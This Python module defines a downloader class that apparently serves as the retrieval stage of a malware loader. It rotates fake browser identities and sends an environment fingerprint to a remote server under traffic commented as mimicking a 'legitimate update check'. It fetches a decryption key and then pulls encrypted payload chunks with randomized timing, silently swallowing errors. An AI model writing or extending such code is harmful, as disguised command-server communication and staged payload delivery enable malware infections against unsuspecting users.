import requests
import time
import random
from .config import Config, get_env_hash

class Downloader:
    # List of modern UAs for rotation
    UAS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ]

    def __init__(self):
        self.session = requests.Session()
        self._rotate_identity()

    def _rotate_identity(self):
        """Randomizes UA and common headers."""
        ua = random.choice(self.UAS)
        self.session.headers.update({
            "User-Agent": ua,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": f"en-US,en;q={random.uniform(0.5, 0.9):.1f}",
            "Cache-Control": "no-cache"
        })

    def get_decryption_key(self):
        """Fetches the session/rolling key from server."""
        try:
            # Send environment hash to authenticate
            payload = {"h": get_env_hash()}
            
            # Mimic legitimate update check
            response = self.session.post(
                Config.BASE_URL + Config.API_DECODE, 
                json=payload,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                if "k" in data and data["k"] != "00000000":
                    return data["k"]
        except Exception:
            pass
        return None

    def fetch_chunk(self, chunk_id, retries=3):
        """Downloads a specific chunk with jitter and exponential backoff."""
        for attempt in range(retries):
            # Exponential Backoff + Jitter
            sleep_time = (2 ** attempt) + random.uniform(0.1, 0.5)
            time.sleep(sleep_time)
            
            try:
                url = f"{Config.BASE_URL}{Config.API_CHUNKS}?id={chunk_id}"
                response = self.session.get(url, timeout=15)
                
                if response.status_code == 200:
                    data = response.json()
                    # Return the 'part' part of the JSON response if valid
                    if data.get("meta", {}).get("valid"):
                        return data.get("p")
            except Exception:
                pass
                
        return None
